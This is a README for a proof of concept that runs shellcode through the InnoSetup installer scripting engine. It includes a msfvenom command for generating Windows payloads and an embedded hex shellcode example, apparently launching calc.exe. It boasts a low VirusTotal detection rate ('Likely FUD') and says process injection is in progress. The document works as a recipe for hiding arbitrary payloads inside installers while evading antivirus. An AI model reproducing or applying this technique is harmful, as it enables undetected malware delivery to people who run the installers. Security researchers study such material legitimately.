# InnoSetup Execute Shellcode PoC

![Screenshot 2021-07-20 at 19.10.40.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-20_at_19.10.40.png)

This PoC demonstrate how to take advantage of InnoSetup scripting engine to run shellcode through Windows API.

The difficulty behind this concept was the lack of important code features (especially pointer support).

## How To

The process of generating your own InnoSetup Shellcode Scripts is now simplified.

You just need to generate your shellcode using the following command:

`msfvenom -p <payload> -a x86 --platform Windows <parameters> EXITFUNC=thread -f hex`

Example: `msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex`

The format must be in hex and aligned to two.

Replace the Payload defined in InnoSetup Script (Top of the script content) with the freshly generated one.

```
#define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
```

And thats it, you build your InnoSetup script and enjoy the result.

NOTICE: I'm working on the possibility to execute shellcode on external process. It is almost finished. 

## VirusTotal Score (20 JULY 2021)

https://www.virustotal.com/gui/file/697f7d55aa19e9dfaa5b86d8117c4f57adaba1ea252e008d7760e0a192515ac8/detection

3/69 (Mostly generic detection because of file reputation) / Likely FUD

![Screenshot 2021-07-20 at 19.09.53.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-20_at_19.09.53.png)
